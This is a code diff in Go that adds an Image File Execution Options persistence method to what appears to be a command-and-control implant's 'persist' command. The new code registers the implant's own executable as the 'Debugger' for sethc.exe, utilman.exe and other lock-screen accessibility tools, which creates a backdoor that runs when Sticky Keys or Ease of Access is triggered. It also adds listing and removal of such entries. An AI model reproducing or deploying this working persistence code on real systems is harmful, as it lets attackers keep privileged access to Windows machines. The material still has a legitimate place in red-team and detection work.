@@ -68,11 +68,13 @@ func (c *PersistCommand) Execute(task structs.Task) structs.CommandResult {
 		return persistCOMHijack(args)
 	case "screensaver":
 		return persistScreensaver(args)
+	case "ifeo":
+		return persistIFEO(args)
 	case "list":
 		return listPersistence(args)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, or list", args.Method),
+			Output:    fmt.Sprintf("Unknown method: %s. Use: registry, startup-folder, com-hijack, screensaver, ifeo, or list", args.Method),
 			Status:    "error",
 			Completed: true,
 		}
@@ -365,6 +367,27 @@ func listPersistence(args persistArgs) structs.CommandResult {
 	}
 	lines = append(lines, "")
 
+	// Check IFEO Debugger entries
+	lines = append(lines, "--- IFEO Debugger (HKLM\\...\\Image File Execution Options) ---")
+	ifeoBasePath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
+	ifeoFound := false
+	for _, target := range ifeoTargets {
+		keyPath := ifeoBasePath + `\` + target[0]
+		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.QUERY_VALUE)
+		if err == nil {
+			debugger, _, err := key.GetStringValue("Debugger")
+			key.Close()
+			if err == nil && debugger != "" {
+				lines = append(lines, fmt.Sprintf("  %s  %s → %s", target[0], target[1], debugger))
+				ifeoFound = true
+			}
+		}
+	}
+	if !ifeoFound {
+		lines = append(lines, "  (none detected)")
+	}
+	lines = append(lines, "")
+
 	// Check Screensaver hijacking
 	lines = append(lines, "--- Screensaver (HKCU\\Control Panel\\Desktop) ---")
 	desktopKey, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.QUERY_VALUE)
@@ -587,6 +610,110 @@ func persistScreensaver(args persistArgs) structs.CommandResult {
 
 		return structs.CommandResult{
 			Output:    fmt.Sprintf("Removed screensaver persistence:\n  Deleted SCRNSAVE.EXE value\n  Disabled screensaver (ScreenSaveActive = 0)"),
+			Status:    "success",
+			Completed: true,
+		}
+
+	default:
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: unknown action '%s'. Use: install or remove", args.Action),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+}
+
+// ifeoTargets are common IFEO targets accessible from the Windows lock screen.
+var ifeoTargets = [][2]string{
+	{"sethc.exe", "Sticky Keys (5x Shift at lock screen)"},
+	{"utilman.exe", "Ease of Access (lock screen button)"},
+	{"osk.exe", "On-Screen Keyboard"},
+	{"narrator.exe", "Narrator"},
+	{"magnify.exe", "Magnifier"},
+}
+
+// persistIFEO installs/removes Image File Execution Options debugger persistence (T1546.012).
+// When the target executable is launched, Windows runs the debugger binary instead.
+func persistIFEO(args persistArgs) structs.CommandResult {
+	if args.Name == "" {
+		return structs.CommandResult{
+			Output:    "Error: name is required (target executable, e.g., sethc.exe, utilman.exe, osk.exe)",
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	ifeoBasePath := `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`
+	keyPath := ifeoBasePath + `\` + args.Name
+
+	switch strings.ToLower(args.Action) {
+	case "install":
+		if args.Path == "" {
+			exe, err := os.Executable()
+			if err != nil {
+				return structs.CommandResult{
+					Output:    fmt.Sprintf("Error getting executable path: %v", err),
+					Status:    "error",
+					Completed: true,
+				}
+			}
+			args.Path = exe
+		}
+
+		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error creating HKLM\\%s: %v (admin required)", keyPath, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		defer key.Close()
+
+		if err := key.SetStringValue("Debugger", args.Path); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error setting Debugger value: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		// Identify the trigger for display
+		trigger := "When " + args.Name + " is launched"
+		for _, t := range ifeoTargets {
+			if strings.EqualFold(args.Name, t[0]) {
+				trigger = t[1]
+				break
+			}
+		}
+
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Installed IFEO persistence:\n  Key:      HKLM\\%s\n  Debugger: %s\n  Trigger:  %s\n  Note:     Requires admin. Target exe passes as first argument to debugger.", keyPath, args.Path, trigger),
+			Status:    "success",
+			Completed: true,
+		}
+
+	case "remove":
+		key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
+		if err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error opening HKLM\\%s: %v", keyPath, err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		defer key.Close()
+
+		if err := key.DeleteValue("Debugger"); err != nil {
+			return structs.CommandResult{
+				Output:    fmt.Sprintf("Error removing Debugger value: %v", err),
+				Status:    "error",
+				Completed: true,
+			}
+		}
+
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Removed IFEO persistence:\n  Key:    HKLM\\%s\n  Deleted Debugger value", keyPath),
 			Status:    "success",
 			Completed: true,
 		}
